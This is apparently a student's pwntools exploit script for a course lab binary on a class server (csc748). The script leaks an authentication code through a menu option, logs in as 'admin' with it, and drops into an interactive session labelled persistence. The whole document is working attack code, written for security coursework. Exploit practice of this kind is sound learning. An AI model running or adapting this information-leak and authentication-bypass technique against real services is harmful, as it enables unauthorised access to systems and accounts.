''' Script Module Importing '''
from pwn import *

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7061)      # Test Script Against Server
# p = process("./6-1_lab.bin")              # Test Script Locally
# p = gdb.debug("./6-1_lab.bin")            # Debug with GDB

''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
'''     Obtain Authentication Code      '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Prepare for Code Leak '''
prog_prompt = p.readuntil(b'Done:')                     # Read in Options Menu
print("\n", prog_prompt.decode('utf-8'), "\n")          # Display Options Menu

p.sendline(b"2")
print(f"[*] Selecting Option (2): Confirm username\n")  # Display Exploit Progress

prog_prompt = p.readuntil(b'is: ')                      # Wait for Program Prompt


''' Leak Code '''
auth_code_bytes = p.readline()                          # Obtain Authentication Code as Bytes


''' Convert Code and Print '''
auth_code_padded = auth_code_bytes.replace(b'\n', 
                                           b'\x00\x00')     # Padded byte string
auth_code_dec = u32(auth_code_padded)                       # Decoded as a decimal integer
auth_code_dec_encoded = str(auth_code_dec).encode('utf-8')  # Decimal Integer Encoded as Bytes
auth_code_hex = hex(auth_code_dec)                          # Hexadecimal Representation of Integer

print(f"[*] Authentication Code Leaked: "
      f"{auth_code_dec} ({auth_code_hex})\n")               # Display Exploit Progress


''' ' ' ' ' ' ' ' ' ' ' ' ' '''
'''     Enter Username      '''
''' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Select Menu Option '''
prog_prompt = p.readuntil(b'Done: ')                    # Wait for Program Prompt
p.sendline(b"1")                                        # Select Option (1): Enter username
print(f"[*] Selecting Option (1): Enter username\n")    # Display Exploit Progress


''' Send Username '''
prog_prompt = p.readuntil(b'Username: ')                # Wait for Program Prompt
p.sendline(b"admin")                                    # Sending username 'admin'
print(f"[*] Sending username 'admin'\n")                # Display Exploit Progress


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
'''     Enter Authentication Code     '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Select Menu Option '''
prog_prompt = p.readuntil(b'Done: ')                    # Wait for Program Prompt
p.sendline(b"3")                                        # Select Option (3): Done
print(f"[*] Selecting Option (3): Done\n")              # Display Exploit Progress

''' Send Authentication Code '''
prog_prompt = p.readuntil(b'\n')                        # Wait for Options Menu
prog_prompt = p.readuntil(b'code: ')                    # Wait for Program Prompt

p.sendline(auth_code_dec_encoded)                       # Sending Authentication Code
print(f"[*] Sending Authentication Code "
      f"{str(auth_code_dec)}\n")                        # Display Exploit Progress


''' ' ' ' ' '  ' ' ' ' ' '''
''' Maintain Persistence '''
''' ' ' ' ' '  ' ' ' ' ' '''
p.interactive()             # Start Interactive Session
